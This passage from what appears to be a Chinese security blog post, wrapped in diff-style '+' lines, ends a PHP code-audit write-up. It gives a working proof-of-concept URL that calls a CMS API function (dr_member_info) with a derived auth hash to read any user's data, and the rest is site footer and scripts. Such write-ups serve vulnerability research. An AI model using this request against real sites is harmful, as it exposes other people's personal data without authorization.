+<p>首先是auth，就是<code>SYS_KEY</code>简单的md5值加密了一下。<code>Auth=50ce0d2401ce4802751739552c8e4467</code><br>然后是<code>param</code>，要进入到function中，<code>param=function</code><br>之后是<code>name</code>，也就是函数名，这里我们调用<code>dr_member_info</code>, <code>name=dr_member_info</code><br>最后是函数的参数，这里我们查询<code>uid</code>为1的用户数据，设置<code>p1=1</code>即可。<br>最终的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=function&amp;name=dr_member_info&amp;p1=1</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt=""></p>
+<p>查看uid=3的用户</p>
+<p><img src="2.png" alt=""></p>
+<p>至此，我们已经可以查看任意用户的所有数据了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/16/PHP代码审计之SQL注入漏洞/" rel="next" title="PHP代码审计之SQL注入漏洞">
+                <i class="fa fa-chevron-left"></i> PHP代码审计之SQL注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/14/CmsEasy-前台SQL注入漏洞/" rel="prev" title="CmsEasy 前台SQL注入漏洞">
+                CmsEasy 前台SQL注入漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Badcode</p>
+              <p class="site-description motion-element" itemprop="description">学习经历</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Badcode</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
